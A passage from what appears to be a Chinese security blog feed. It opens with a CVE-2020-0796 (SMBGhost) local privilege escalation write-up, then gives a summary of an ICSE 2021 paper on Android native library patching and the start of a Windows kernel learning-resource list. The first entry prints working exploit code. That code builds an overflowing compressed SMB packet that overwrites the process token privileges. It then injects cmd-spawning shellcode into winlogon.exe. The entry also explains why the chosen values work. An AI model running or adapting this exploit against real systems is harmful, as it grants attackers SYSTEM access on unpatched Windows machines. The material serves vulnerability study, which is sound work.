c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send_compressed</span><span class="params">(SOCKET sock, <span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="built_in">buffer</span>, ULONG len)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> response[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">uint8_t</span> buf[] = &#123;</span><br><span class="line">		<span class="comment">/* NetBIOS Wrapper */</span></span><br><span class="line">		<span class="number">0x00</span>,</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x33</span>,</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* SMB Header */</span></span><br><span class="line">		<span class="number">0xFC</span>, <span class="number">0x53</span>, <span class="number">0x4D</span>, <span class="number">0x42</span>, <span class="comment">/* protocol id */</span></span><br><span class="line">		<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="comment">/* original decompressed size, trigger arithmetic overflow */</span></span><br><span class="line">		<span class="number">0x02</span>, <span class="number">0x00</span>,             <span class="comment">/* compression algorithm, LZ77 */</span></span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>,             <span class="comment">/* flags */</span></span><br><span class="line">		<span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">/* offset */</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* packet = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(buf) + <span class="number">0x10</span> + len);</span><br><span class="line">	<span class="keyword">if</span> (packet == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Couldn't allocate memory with malloc()\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> error_exit(sock, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(packet, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(packet + <span class="keyword">sizeof</span>(buf)) = <span class="number">0x1FF2FFFFBC</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(packet + <span class="keyword">sizeof</span>(buf) + <span class="number">0x8</span>) = <span class="number">0x1FF2FFFFBC</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(packet + <span class="keyword">sizeof</span>(buf) + <span class="number">0x10</span>, <span class="built_in">buffer</span>, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((err = send(sock, (<span class="keyword">const</span> <span class="keyword">char</span>*)packet, <span class="keyword">sizeof</span>(buf) + <span class="number">0x10</span> + len, <span class="number">0</span>)) != SOCKET_ERROR) &#123;</span><br><span class="line">		recv(sock, response, <span class="keyword">sizeof</span>(response), <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(packet);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line">    <span class="keyword">if</span> (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) &#123;</span><br><span class="line">		<span class="keyword">return</span> error_exit(sock, <span class="string">"send()"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4><span id="pzhu-ru-winlogon-jin-cheng-kai-qi-shell">注入winlogon进程，开启shell</span><a href="#pzhu-ru-winlogon-jin-cheng-kai-qi-shell" class="header-anchor">#</a></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	PROCESSENTRY32 entry;</span><br><span class="line">	entry.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span> shellcode[] = &#123;</span><br><span class="line">		 <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x55</span>, <span class="number">0x6A</span>, <span class="number">0x60</span>, <span class="number">0x5A</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x54</span>,</span><br><span class="line">		 <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x28</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x32</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x76</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x76</span>,</span><br><span class="line">		 <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0xAD</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x30</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x03</span>, <span class="number">0x57</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0x17</span>,</span><br><span class="line">		 <span class="number">0x28</span>, <span class="number">0x8B</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xFE</span>, <span class="number">0x8B</span>, <span class="number">0x54</span>, <span class="number">0x1F</span>, <span class="number">0x24</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x2C</span>, <span class="number">0x17</span>,</span><br><span class="line">		 <span class="number">0x8D</span>, <span class="number">0x52</span>, <span class="number">0x02</span>, <span class="number">0xAD</span>, <span class="number">0x81</span>, <span class="number">0x3C</span>, <span class="number">0x07</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x45</span>, <span class="number">0x75</span>, <span class="number">0xEF</span>, <span class="number">0x8B</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>,</span><br><span class="line">		 <span class="number">0x1C</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xFE</span>, <span class="number">0x8B</span>, <span class="number">0x34</span>, <span class="number">0xAE</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xF7</span>, <span class="number">0x99</span>,</span><br><span class="line">		 <span class="number">0xff</span>, <span class="number">0xc2</span>, <span class="comment">// inc edx (1 = SW_SHOW)</span></span><br><span class="line">		 <span class="number">0xFF</span>, <span class="number">0xD7</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>,</span><br><span class="line">		 <span class="number">0x30</span>, <span class="number">0x5D</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0xC3</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> pid = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (Process32First(snapshot, &amp;entry) == TRUE) &#123;</span><br><span class="line">		<span class="keyword">while</span> (Process32Next(snapshot, &amp;entry) == TRUE) &#123;</span><br><span class="line">			<span class="keyword">if</span> (lstrcmpiA(entry.szExeFile, <span class="string">"winlogon.exe"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">				pid = entry.th32ProcessID;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(snapshot);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Could not find process\n"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Injecting shellcode in winlogon...\n"</span>);</span><br><span class="line"></span><br><span class="line">	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Could not open process\n"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LPVOID lpMem = VirtualAllocEx(hProc, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpMem == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Remote allocation failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;		</span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hProc, lpMem, shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Remote write failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">if</span> (!CreateRemoteThread(hProc, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpMem, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"CreateRemoteThread failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Success! ;)\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="pli-yong-fen-xi">利用分析</span><a href="#pli-yong-fen-xi" class="header-anchor">#</a></h3><h4><span id="pfen-pei-nei-cun-shu-ju">分配内存数据</span><a href="#pfen-pei-nei-cun-shu-ju" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* SMB Header *&#x2F;</span><br><span class="line">	0xFC, 0x53, 0x4D, 0x42, &#x2F;* protocol id *&#x2F;</span><br><span class="line">	0xFF, 0xFF, 0xFF, 0xFF, &#x2F;* original decompressed size, trigger arithmetic overflow *&#x2F;</span><br><span class="line">	0x02, 0x00,             &#x2F;* compression algorithm, LZ77 *&#x2F;</span><br><span class="line">	0x00, 0x00,             &#x2F;* flags *&#x2F;</span><br><span class="line">	0x10, 0x00, 0x00, 0x00, &#x2F;* offset *&#x2F;</span><br></pre></td></tr></table></figure><p>溢出构造：<code>0xffffffff</code>+<code>0x10</code>溢出为0xf</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-a0f3a5a3-82a8-448f-a223-b97460cd0719.png" alt="img"></p><p>0x1ff2ffffbc</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322193011259.png" alt="image-20210322193011259"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322193820772.png" alt="image-20210322193820772"></p><p>0xf对应于0x1100的表项，但其实分配内存大于0x1100，为<code>0x1100 + 0xE8 + 2*(MmSizeOfMdl + 8)</code></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322194046658.png" alt="image-20210322194046658"></p><p>最后返回的return_buffer是一个初始化后的内存数据结构</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322194929310.png" alt="image-20210322194929310"></p><p>分配后的结构如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-8e72a4b3-edfb-4bbc-8f47-0228e19640db.png" alt="img"></p><p>return_buffer+0x18指向了0x50处的位置</p><h4><span id="pjie-ya-payload">解压payload</span><a href="#pjie-ya-payload" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322203657294.png" alt="image-20210322203657294"></p><p>解压函数参数含义如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SmbCompressionDecompress(CompressAlgo，&#x2F;&#x2F;压缩算法</span><br><span class="line">			Compressed_buf，&#x2F;&#x2F;指向数据包中的压缩数据</span><br><span class="line">			Compressed_size，&#x2F;&#x2F;数据包中压缩数据大小，计算得到</span><br><span class="line">			UnCompressedBuf,&#x2F;&#x2F;解压后的数据存储地址，*(return_buffer+0x18)+0x10</span><br><span class="line">			UnCompressedSize,&#x2F;&#x2F;压缩数据原始大小,源于数据包OriginalCompressedSegmentSize</span><br><span class="line">			FinalUnCompressedSize)&#x2F;&#x2F;最终解压后数据大小</span><br></pre></td></tr></table></figure><p>通过解压，将payload解压到*(return_buffer+0x18)+0x10位置，也就是图中0x60所指位置</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-560b4981-284d-495f-9b49-628e060e06e2.png" alt="img"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-1ae86555-492c-41ef-a957-c2d0e57a273a.png" alt="img"></p><h4><span id="pyi-dong-payload-shi-xian-gong-ji">移动payload实现攻击</span><a href="#pyi-dong-payload-shi-xian-gong-ji" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322203831509.png" alt="image-20210322203831509"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memmove((alloc_buffer+0x18)，SMB_payload，offset)</span><br></pre></td></tr></table></figure><p>此时<code>alloc_buffer</code>指向tokenAddr地址，而SMB_payload则是对应的权限数据，因此可以实现替换token权限攻击</p><h4><span id="pwei-shi-me-shi-0x1ff2ffffbc">为什么是0x1ff2ffffbc</span><a href="#pwei-shi-me-shi-0x1ff2ffffbc" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-15.png" alt="img"></p><p>tokenAddr+0x40是权限位置，控制当前进程权限</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-16.png" alt="img"></p><p>System进程token+0x40位置的值为0x1ff2ffffbc，因此替换后就使得当前进程拥有了System进程权限，继而通过注入其他进程获取系统权限的cmd。</p><h3><span id="pcan-kao-lian-jie">参考链接</span><a href="#pcan-kao-lian-jie" class="header-anchor">#</a></h3><ul><li><a href="https://jcxp.github.io/2020/03/31/CVE-2020-0796-SMB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://jcxp.github.io/2020/03/31/CVE-2020-0796-SMB漏洞分析/</a></li><li><a href="https://github.com/danigargu/CVE-2020-0796/blob/master/cve-2020-0796-local/exploit.cpp">https://github.com/danigargu/CVE-2020-0796/blob/master/cve-2020-0796-local/exploit.cpp</a></li><li><a href="https://paper.seebug.org/1168/">https://paper.seebug.org/1168/</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Too Quiet in the Library-An Empirical Study of Security Updates in Android Apps Native Code(ICSE 2021)</title>
    <url>/dc7da355.html</url>
    <content><![CDATA[<p>论文：<a href="https://arxiv.org/pdf/1911.09716.pdf">https://arxiv.org/pdf/1911.09716.pdf</a></p><p>代码：<a href="https://github.com/salmanee/Librarian">https://github.com/salmanee/Librarian</a></p><a id="more"></a><h3><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h3><p><strong>研究背景</strong>：为了加速执行和复用，native code(.so)在安卓的app里十分常见，但是因为未及时更新安全补丁甚至直接忽略，导致可以长时间被利用</p><p>为了深入了解这类现象，作者选择2013年9月到2020年5月google play上最受欢迎的200个app进行调查</p><p><strong>研究重点</strong>：对.so库和版本的识别，提出了LibRARIAN（LibRAry veRsion IdentificAtioN）方法，根据bin2sim准确识别库和版本</p><p><strong>研究结果</strong>：</p><ol><li>具有已知CVE的易受攻击版本的53/200个流行应用（占26.5％），其中14个仍然易受攻击</li><li>应用程序开发人员平均花费528.71±40.20天来更新安全补丁，而库开发人员在54.59±8.12天后发布安全补丁，是更新速度的10倍</li></ol><p><strong>研究贡献</strong>：</p><ol><li>定位.so库和版本的方法LibRARIAN，测试集上表现准确率为91.15%</li><li>一个大型的数据库：7年内的200个app的7678个版本，包含66,684个native库</li></ol><h3><span id="plibrarian">LibRARIAN</span><a href="#plibrarian" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317144110955.png" alt="image-20210317144110955"></p><h4><span id="pte-zheng-xuan-ze">特征选择</span><a href="#pte-zheng-xuan-ze" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317144803901.png" alt="image-20210317144803901"></p><p>MetaData:</p><ul><li>库的导出变量</li><li>库的导入变量</li><li>库的导出函数</li><li>库的导入函数</li><li>库的依赖，<a href="http://xn--a-kb7av23a.xn--sob-ye0el06xh2eztt.so">例如a.so需要依赖b.so</a></li></ul><p>Data：</p><ul><li>代表版本的字符串常量，LibFoo-1.0.2</li></ul><p>没有选择数据流和控制流，因为和编译相关，并不稳定，而且相关算法基本和代码大小呈现指数级复杂度</p><h4><span id="pgou-jian-ground-truth">构建Ground Truth</span><a href="#pgou-jian-ground-truth" class="header-anchor">#</a></h4><p>通过正则去匹配版本，构建Ground Truth，实现上是通过Angr的ELF模块进行解析，在只读串中进行搜索版本字符串，实现了对x86-64, x86, ARM, and ARM64架构下库的分析</p><p>也做了一点数据清洗，比如尽可能多的搜集不同架构，去除只在一种架构下出现的字符串</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317145345387.png" alt="image-20210317145345387"></p><h4><span id="pxiang-si-du-ji-suan">相似度计算</span><a href="#pxiang-si-du-ji-suan" class="header-anchor">#</a></h4><p>比较某app中.so和Ground Truth中.so的相似度</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317160053731.png" alt="image-20210317160053731"></p><p>最后设置一个最低的相似度阈值0.85</p><p>一些影响因素：</p><ul><li>开发者的修改，例如删除某些函数，会导致相似度降低</li><li>为了减小大小，会去除无用模块，并且strip信息</li><li>一些架构下，导出的函数会更多</li></ul><h4><span id="pji-duan-qing-kuang-chu-li">极端情况处理</span><a href="#pji-duan-qing-kuang-chu-li" class="header-anchor">#</a></h4><p>比如导出导入函数很少甚至没有的情况，以及比较结果很差的情况，会再次利用版本字符串去帮助确定版本</p><p>找版本字符串：对常见的版本字符串进行聚类，提取他们的组成正则表达式</p><h3><span id="pevalutation">Evalutation</span><a href="#pevalutation" class="header-anchor">#</a></h3><p><strong>回答三个问题</strong></p><ol><li>LibRARIAN准确率和效率</li><li>Native library问题在安卓应用中多么普遍</li><li>开发者对补丁的响应时间</li></ol><p><strong>数据准备</strong>：从google play搜集了200个软件，共7,678个不同历史版本</p><p><strong>发现1</strong>：流行的Android app中，大约每个app拥有11个.so文件也就是native代码库，而某些app拥有超多数量的代码库，例如Instgram在其2013年12月到2020年的所有版本中一共包含了6677个不同版本的.so文件，最多的时候特定版本的Instgram居然包含了141个.so文件</p><p><strong>发现2</strong>：提取特征2117个，最多的LibWave和Libtensorflow可以有79581个特征</p><p><strong>回答问题1：</strong></p><p>效率：</p><ol><li>提取特征很快，最复杂的LibTensorflow的分析只需要4分钟38秒</li><li>分析很快，最慢224秒，最快97秒，平均118秒</li></ol><p>准确率：</p><p>LibRARIAN 对46个不同库的904个样本的分析结果中有824 (91.15%) 个是正确的，即使是那些不正确的，推断出的版本号和正确版本的差别也很小</p><p>特征对准确率影响：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317164045365.png" alt="image-20210317164045365"></p><p><strong>回答问题2：</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317164218050.png" alt="image-20210317164218050"></p><ol><li>具有已知CVE的易受攻击版本的53/200个流行应用（占26.5％），其中14个仍然易受攻击，且这些app安装量惊人，攻击面很大</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317164418341.png" alt="image-20210317164418341"></p><p><strong>回答问题3：</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317164506377.png" alt="image-20210317164506377"></p><ol><li>应用程序开发人员平均花费528.71±40.20天来更新安全补丁，而库开发人员在54.59±8.12天后发布安全补丁，是更新速度的10倍</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317164541238.png" alt="image-20210317164541238"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-19-03-image-20210317164615253.png" alt="image-20210317164615253"></p><h3><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h3><p>内容不难，但是论文中的分析写的好</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Kernel Resources</title>
    <url>/17ea52bf.html</url>
    <content><![CDATA[<blockquote><p>windows kernel学习资料整理,Github链接为<a href="https://github.com/ycdxsb/Windows_Kernel_Resources">Windows_kernel_Resources</a></p></blockquote><a id="more"></a><ul><li><a href="#windows%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Windows基础知识</a><ul><li><a href="#windows%E7%9B%B8%E5%85%B3%E4%B9%A6%E7%B1%8D">Windows相关书籍</a></li><li><a href="#windows%E7%9B%B8%E5%85%B3%E6%BA%90%E4%BB%A3%E7%A0%81">Windows相关源代码</a></li><li><a href="#windows%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD">Windows镜像下载</a></li></ul></li><li><a href="#windows-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">Windows 内核漏洞利用技术</a><ul><li><a href="#%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">内核利用基础知识</a></li><li><a href="#%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7">内核调试工具</a></li><li><a href="#hevd-%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%E6%95%99%E7%A8%8B">HEVD 内核利用教程</a></li><li><a href="#token-%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8">token 权限滥用</a></li><li><a href="#gdi-%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83">GDI 滥用提权</a><ul><li><a href="#bitmap--rs1v1607%E5%89%8D">BitMap RS1(v1607)前</a></li><li><a href="#accelerator-table-rs1v1607">Accelerator Table RS1(v1607)</a></li><li><a href="#lpszmenuname-rs2v1703">lpszMenuName RS2(v1703)</a></li><li><a href="#palette-rs3-v1709">Palette RS3 (v1709)</a></li><li><a href="#%E7%BB%BC%E8%BF%B0">综述</a></li></ul></li><li><a href="#%E5%A0%86%E5%88%A9%E7%94%A8">堆利用</a></li><li><a href="#%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87">保护绕过</a></li><li><a href="#payload">Payload</a></li><li><a href="#%E7%BB%BC%E8%BF%B0-1">综述</a></li></ul></li><li><a href="#windows-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">Windows 漏洞分析</a><ul><li><a href="#windows-%E8%A1%A5%E4%B8%81">Windows 补丁</a></li><li><a href="#windows-%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88">Windows 漏洞集合</a></li><li><a href="#cve%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">CVE漏洞分析</a><ul><li><a href="#cve-2020-0787-bits%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%A7%BB%E5%8A%A8%E6%BC%8F%E6%B4%9E">CVE-2020-0787 BITS任意文件移动漏洞</a></li><li><a href="#cve-2020-0796-smb-ghost-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E">CVE-2020-0796 SMB Ghost 整数溢出漏洞</a></li></ul></li><li><a href="#windows-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">Windows 分析工具</a></li></ul></li><li><a href="#windows-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">Windows 渗透测试</a><ul><li><a href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90">攻击面分析</a></li><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7">渗透测试工具</a></li><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E6%BC%8F%E6%B4%9E">渗透测试常用漏洞</a><ul><li><a href="#ms17-010-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D">MS17-010 永恒之蓝</a></li></ul></li><li><a href="#%E7%BB%BC%E8%BF%B0-2">综述</a></li></ul></li><li><a href="#paper">Paper</a></li><li><a href="#%E7%BB%BC%E5%90%88%E6%80%A7%E8%B5%84%E6%BA%90">综合性资源</a></li></ul><h2><span id="pwindows-ji-chu-zhi-shi">Windows基础知识</span><a href="#pwindows-ji-chu-zhi-shi" class="header-anchor">#</a></h2><h3><span id="pwindows-xiang-guan-shu-ji">Windows相关书籍</span><a href="#pwindows-xiang-guan-shu-ji" class="header-anchor">#</a></h3><ul><li>《寒江独钓——Windows内核安全编程》</li><li>《天书夜读——从汇编语言到Windows内核编程》</li><li>《Windows内核情景分析》上下册</li><li>《Windows驱动开发技术详解》</li><li>《深入解析Windows操作系统(第6版)》上下册</li></ul><h3><span id="pwindows-xiang-guan-yuan-dai-ma">Windows相关源代码</span><a href="#pwindows-xiang-guan-yuan-dai-ma" class="header-anchor">#</a></h3><ul><li>【The Windows Research Kernel AKA WRK】<ul><li><a href="https://github.com/zhuhuibeishadiao/ntoskrnl">download</a></li></ul></li><li>【ReactOS：A free Windows-compatible Operating System】<ul><li><a href="https://github.com/reactos/reactos">download</a></li></ul></li><li>【Windows内核泄露源码的】<ul><li><a href="https://github.com/cryptoAlgorithm/nt5src">download</a></li><li><a href="https://github.com/travismills82/nt5src">download</a></li></ul></li></ul><h3><span id="pwindows-jing-xiang-xia-zai">Windows镜像下载</span><a href="#pwindows-jing-xiang-xia-zai" class="header-anchor">#</a></h3><ul><li><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></li><li><a href="https://next.itellyou.cn/">https://next.itellyou.cn/</a></li><li><a href="https://en.wikipedia.org/wiki/Windows_10_version_history%EF%BC%9AWin10%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB">https://en.wikipedia.org/wiki/Windows_10_version_history：Win10版本关系</a></li></ul><h2><span id="pwindows-nei-he-lou-dong-li-yong-ji-zhu">Windows 内核漏洞利用技术</span><a href="#pwindows-nei-he-lou-dong-li-yong-ji-zhu" class="header-anchor">#</a></h2><h3><span id="pnei-he-li-yong-ji-chu-zhi-shi">内核利用基础知识</span><a href="#pnei-he-li-yong-ji-chu-zhi-shi" class="header-anchor">#</a></h3><ul><li>Windows架构设计<ul><li>【Windows架构设计】<ul><li><a href="https://r00tk1ts.github.io/2017/12/19/Windows%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/">中文博客</a></li></ul></li></ul></li><li>Windows权限管理<ul><li>【浅析Windows的访问权限检查机制】<ul><li><a href="http://drops.xmd5.com/static/drops/tips-11803.html">中文博客</a></li></ul></li></ul></li><li>Windows相关结构体<ul><li>【terminus】：很好的Windows结构搜索网页<ul><li><a href="http://terminus.rewolf.pl/terminus/">page link</a></li></ul></li><li>【关键的windows内核数据结构一览(上)】<ul><li><a href="https://r00tk1ts.github.io/2018/01/08/%E5%85%B3%E9%94%AE%E7%9A%84Windows%E5%86%85%E6%A0%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80%E8%A7%88%EF%BC%88%E4%B8%8A%EF%BC%89/">中文博客</a></li></ul></li><li>【关键的windows内核数据结构一览(下)】<ul><li><a href="https://r00tk1ts.github.io/2018/01/14/%E5%85%B3%E9%94%AE%E7%9A%84Windows%E5%86%85%E6%A0%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80%E8%A7%88%EF%BC%88%E4%B8%8B%EF%BC%89/">中文博客</a></li></ul></li><li>【Catalog of key Windows kernel data structures】<ul><li><a 